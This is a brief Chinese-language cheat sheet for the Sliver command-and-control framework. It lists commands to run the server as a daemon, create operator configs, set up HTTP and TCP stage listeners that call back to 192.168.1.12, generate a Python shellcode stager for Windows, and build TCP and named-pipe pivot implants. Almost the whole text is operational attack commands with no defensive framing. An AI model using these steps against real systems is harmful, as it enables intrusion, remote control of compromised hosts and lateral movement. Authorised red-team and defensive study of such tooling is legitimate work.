团队协作

# sliver-server服务端生成客户端配置文件
sudo /root/sliver-server operator --name admin --lhost 192.168.1.12 --lport 45678 --save admin.cfg

# 后台以守护进程方式运行sliver-server在45678端口
nohup /root/sliver-server daemon --lport 45678 &

# sliver-client客户端导入配置文件
sliver-client import admin.cfg

# 连接silver服务端
sliver-client

生成session shellcode（python版）

# 创建stager配置文件
profiles new --http 192.168.1.12:8848 --skip-symbols --format shellcode --arch amd64 win64stage

# 开启监听
http -l 8848

# 创建分阶段监听器
stage-listener --url tcp://192.168.1.12:80 --profile win64stage

# 创建Stager
generate stager --lhost 192.168.1.12 --lport 80 --arch amd64 --format py

pivot tcp -b 10.0.0.1 -l 8989

# 生成
generate --tcp-pivot 10.0.0.1:8989 -s ./tmp/pivot.exe


# smb
# 先进入已控session
named-pipe -a -b bbbaaa

# 生成
generate --named-pipe 10.0.0.1/pipe/bbbaaa -s ./tmp/pivot.exe
